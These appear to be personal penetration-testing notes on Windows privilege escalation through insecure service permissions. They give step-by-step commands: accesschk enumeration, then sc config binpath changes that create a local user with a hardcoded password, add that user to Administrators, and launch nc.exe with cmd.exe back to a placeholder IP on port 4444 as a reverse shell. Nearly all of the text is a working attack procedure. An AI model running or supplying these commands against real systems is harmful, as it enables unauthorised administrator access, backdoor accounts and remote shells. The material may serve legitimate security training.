# Exploiting the insecure service permissions
# If metasploit then use -> exploit/windows/local/service_permissions


1. Use accesschk.exe under Scripts/Privilege Escalation/ Windows/

2. Do - accesschk.exe /accepteula FIRST!
THEN accesschk.exe -uwcqv "OUR USER" *

3. We find a vulnerable service on the last command

4. sc qc "Vulnerable service here"

5. Change the binpath as follows -

  1. sc config "Vulnerable Service" binpath= "net user sukrit sukrit123 /add"
  2. sc config "Vulnerable Service" binpath= "C:/path to nc.exe/ nc.exe <IP ADDRESS> 4444 -e cmd.exe"

6. sc stop "Vulnerable service here"

7. sc start "Vulnerable service here"

NOTE : We may receive an error because net user is not a service so keep going.

8. Add binpath again to add to administrators group
  1.  sc config "Vulnerable Service" binpath= "net localgroup Administrators sukrit /add"
